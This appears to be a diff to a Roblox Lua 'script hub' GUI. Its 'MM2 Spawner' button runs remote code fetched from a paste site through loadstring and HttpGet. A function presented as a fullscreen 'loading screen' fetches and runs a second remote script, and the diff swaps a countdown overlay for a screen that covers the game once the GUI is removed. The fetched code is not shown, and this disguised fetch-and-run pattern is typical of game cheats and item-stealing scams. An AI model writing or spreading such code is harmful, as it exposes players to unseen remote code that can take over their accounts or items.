@@ -14,7 +14,7 @@ ScreenGui.Name = "GameScriptHub"
 -- Toggle button (top center)
 local ToggleBtn = Instance.new("TextButton", ScreenGui)
 ToggleBtn.Size = UDim2.new(0, 40, 0, 40)
-ToggleBtn.Position = UDim2.new(0.5, 0, 0.02, 0) -- centered horizontally
+ToggleBtn.Position = UDim2.new(0.5, 0, 0.02, 0) -- top center
 ToggleBtn.AnchorPoint = Vector2.new(0.5,0)
 ToggleBtn.Text = "X"
 ToggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
@@ -25,7 +25,7 @@ Corner.CornerRadius = UDim.new(0,20)
 
 -- Main Frame
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0.8,0,0.7,0) -- scale-based for mobile
+MainFrame.Size = UDim2.new(0.8,0,0.7,0)
 MainFrame.Position = UDim2.new(0.1,0,0.15,0)
 MainFrame.AnchorPoint = Vector2.new(0,0)
 MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
@@ -61,35 +61,6 @@ ToggleBtn.MouseButton1Click:Connect(function()
     MainFrame.Visible = guiVisible
 end)
 
--- Overlay / Wait Timer
-local function WaitOverlay(duration)
-    if MainFrame then MainFrame:Destroy() end
-
-    local overlay = Instance.new("Frame", ScreenGui)
-    overlay.Size = UDim2.new(1,0,1,0)
-    overlay.Position = UDim2.new(0,0,0,0)
-    overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
-    overlay.BackgroundTransparency = 0.6
-    overlay.ZIndex = 10
-
-    local timerLabel = Instance.new("TextLabel", overlay)
-    timerLabel.Size = UDim2.new(0.5,0,0.1,0)
-    timerLabel.Position = UDim2.new(0.25,0,0.45,0)
-    timerLabel.BackgroundTransparency = 1
-    timerLabel.TextScaled = true
-    timerLabel.Font = Enum.Font.GothamBold
-    timerLabel.TextColor3 = Color3.fromRGB(255,255,255)
-
-    for i = duration,0,-1 do
-        timerLabel.Text = tostring(i)
-        wait(1)
-    end
-
-    timerLabel.Text = "It may be laggy..."
-    wait(2)
-    overlay:Destroy()
-end
-
 -- Create button function
 local function CreateButton(name, callback)
     local btn = Instance.new("TextButton", ButtonsFrame)
@@ -103,8 +74,38 @@ local function CreateButton(name, callback)
     btn.MouseButton1Click:Connect(callback)
 end
 
+-- Function to show fullscreen Goofy loading screen
+local function ShowLoadingScreen()
+    local overlay = Instance.new("ScreenGui", PlayerGui)
+    overlay.Name = "LoadingOverlay"
+
+    local bg = Instance.new("Frame", overlay)
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.Position = UDim2.new(0,0,0,0)
+    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    bg.BackgroundTransparency = 0.4
+
+    local loadingLabel = Instance.new("TextLabel", bg)
+    loadingLabel.Size = UDim2.new(1,0,0.1,0)
+    loadingLabel.Position = UDim2.new(0,0,0.45,0)
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.Text = "Loading..."
+    loadingLabel.TextScaled = true
+    loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    loadingLabel.Font = Enum.Font.GothamBold
+
+    -- Execute Goofy loading screen script
+    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
+end
+
 -- Add MM2 Spawner button
 CreateButton("MM2 Spawner", function()
+    -- Run paste.debian script
     loadstring(game:HttpGet("https://paste.debian.net/plainh/0f441c13/", true))()
-    WaitOverlay(300) -- 5 minutes countdown
+
+    -- Remove GUI
+    if MainFrame then MainFrame:Destroy() end
+
+    -- Show fullscreen loading screen
+    ShowLoadingScreen()
 end)
